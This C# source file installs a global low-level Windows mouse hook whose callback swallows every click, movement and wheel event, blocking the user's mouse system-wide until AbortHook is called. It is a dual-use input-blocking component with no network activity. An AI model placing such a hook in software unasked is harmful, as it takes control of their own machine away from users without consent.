using System;
using System.Runtime.InteropServices;
using static HookHardware.Imports;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace HookHardware
{
    public class Mouse
    {

        protected static IntPtr ptrHook;
        internal delegate IntPtr LowLevelMouse(int nCode, IntPtr wParam, IntPtr lParam);
        internal static LowLevelMouse callback;

		public void AbortHook()
		{
			try
			{
				if (ptrHook != IntPtr.Zero)
					UnhookWindowsHookEx(ptrHook);
			}
			catch { }
		}
		public void HookMouse()
		{
			callback = new LowLevelMouse(BlockKey);
			ptrHook = SetWindowsHookEx(14, callback, System.Diagnostics.Process.GetCurrentProcess().MainModule.BaseAddress, 0);
		}

		protected static IntPtr BlockKey(int nCode, IntPtr wp, IntPtr lp)
		{
			try
			{
				if (nCode >= 0)
				{
					MSLLHOOKSTRUCT objKeyInfo = (MSLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(MSLLHOOKSTRUCT));
					if (wp == (IntPtr)WM_LBUTTONDOWN) //WM_LBUTTONDOWN
					{
						return wp;
					}
					if (wp == (IntPtr)WM_LBUTTONUP) //WM_LBUTTONUP
					{
						return wp;
					}
					if (wp == (IntPtr)WM_LEFT_CLICK) //'LEFT DB CLICK
					{
						return wp;
					}
					if (wp == (IntPtr)WM_RBUTTONDOWN) //'WM_RBUTTONDOWN
					{
						return wp;
					}
					if (wp == (IntPtr)WM_RBUTTONUP) //'WM_RBUTTONUP
					{
						return wp;
					}
					if (wp == (IntPtr)WM_RBUTTONDBLCLK) //' WM_RBUTTONDBLCLK
					{
						return wp;
					}
					if (wp == (IntPtr)WM_MOUSEMOVE) //' MOUSE MOVE
					{
						return wp;
					}
					if (wp == (IntPtr)WM_MOUSEWHEEL) //' MOUSE MOVE
					{
						return wp;
					}
					if (wp == (IntPtr)WM_MOUSEHWHEEL) //' MOUSE MOVE
					{
						return wp;
					}
				}
				else
				{}
				return IntPtr.Zero;
			}
			catch { }

			return IntPtr.Zero;
		}
	}
}

